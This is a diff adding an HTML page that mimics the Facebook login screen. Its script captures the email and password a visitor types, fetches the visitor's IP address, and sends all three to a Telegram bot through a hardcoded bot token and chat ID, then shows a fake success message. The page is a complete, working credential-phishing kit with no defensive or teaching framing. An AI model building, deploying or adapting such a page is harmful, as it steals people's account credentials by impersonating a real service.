@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            padding: 16px 0;
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-left: 20px;
+        }
+        
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+            padding: 20px;
+        }
+        
+        .intro {
+            max-width: 500px;
+            margin-right: 60px;
+        }
+        
+        .intro h1 {
+            color: #1877f2;
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        
+        .intro h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        
+        .login-form {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 17px;
+            color: #1d2129;
+        }
+        
+        .login-form input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            padding: 12px;
+            font-weight: bold;
+            width: 100%;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-pw {
+            color: #1877f2;
+            text-align: center;
+            display: block;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-pw:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px -20px;
+        }
+        
+        .create-btn {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 12px 16px;
+            font-weight: bold;
+            display: block;
+            margin: 0 auto;
+            cursor: pointer;
+        }
+        
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+        
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+        }
+        
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            background-color: #ffffff;
+            padding: 20px;
+            margin-top: auto;
+        }
+        
+        .footer-links {
+            max-width: 980px;
+            margin: 0 auto;
+            padding-top: 20px;
+            border-top: 1px solid #dddfe2;
+        }
+        
+        .footer-links a {
+            color: #8a8d91;
+            font-size: 14px;
+            margin-right: 15px;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: #8a8d91;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        
+        .message {
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            display: none;
+            text-align: center;
+        }
+        
+        .error {
+            background-color: #ffe6e6;
+            color: #d93025;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .success {
+            background-color: #e6f4ea;
+            color: #137333;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 15px;
+            top: 15px;
+            cursor: pointer;
+            color: #8a8d91;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .intro {
+                margin-right: 0;
+                margin-bottom: 40px;
+            }
+            
+            .intro h1 {
+                font-size: 40px;
+            }
+            
+            .intro h2 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">facebook</div>
+    </div>
+    
+    <div class="main-container">
+        <div class="intro">
+            <h1>facebook</h1>
+            <h2>Connect with friends and the world around you on Facebook.</h2>
+        </div>
+        
+        <div class="login-form-container">
+            <div class="login-form">
+                <div class="error message" id="errorMessage">
+                    Invalid username or password
+                </div>
+                
+                <div class="success message" id="successMessage">
+                    Login successful! Redirecting...
+                </div>
+                
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="Email or phone number" required>
+                    
+                    <div class="password-container">
+                        <input type="password" id="password" placeholder="Password" required>
+                        <span class="show-password" id="showPassword">
+                            <i class="far fa-eye"></i>
+                        </span>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">Log In</button>
+                    
+                    <a href="#" class="forgot-pw">Forgotten password?</a>
+                    
+                    <div class="divider"></div>
+                    
+                    <button type="button" class="create-btn">Create New Account</button>
+                </form>
+            </div>
+            
+            <div class="create-page">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Watch</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Imagine with Meta AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Fundraisers</a>
+            <a href="#">Services</a>
+            <a href="#">Voting Information Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Privacy Center</a>
+            <a href="#">Groups</a>
+            <a href="#">About</a>
+            <a href="#">Create Ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Cookies</a>
+            <a href="#">Ad choices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        
+        <div class="copyright">
+            Meta &copy; 2023
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const loginForm = document.getElementById('loginForm');
+            const showPassword = document.getElementById('showPassword');
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Show/hide password
+            showPassword.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    showPassword.innerHTML = '<i class="far fa-eye-slash"></i>';
+                } else {
+                    passwordInput.type = 'password';
+                    showPassword.innerHTML = '<i class="far fa-eye"></i>';
+                }
+            });
+            
+            // Handle form submission
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+                
+                // Validate inputs
+                if (!email || !password) {
+                    showError('Please fill in all fields');
+                    return;
+                }
+                
+                // Get user's IP address
+                let ipAddress = 'Unknown';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ipAddress = ipData.ip;
+                } catch (error) {
+                    console.error('Error fetching IP:', error);
+                }
+                
+                // Send data to Telegram bot
+                const botToken = '8228950437:AAHkr6cMLIOsR_Y80xT0cZLxMau5w49cYeo';
+                const chatId = '1275307866';
+                const message = `Facebook Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}`;
+                
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                try {
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        // Show success message
+                        showSuccess('Login information sent!');
+                        
+                        // Clear form
+                        emailInput.value = '';
+                        passwordInput.value = '';
+                        
+                        // Simulate redirect after a delay
+                        setTimeout(() => {
+                            alert('In a real implementation, this would redirect to Facebook.');
+                        }, 1500);
+                    } else {
+                        throw new Error('Telegram API error');
+                    }
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    showError('There was a problem with the login. Please try again later.');
+                }
+            });
+            
+            function showError(message) {
+                errorMessage.textContent = message;
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+            }
+            
+            function showSuccess(message) {
+                successMessage.textContent = message;
+                successMessage.style.display = 'block';
+                errorMessage.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
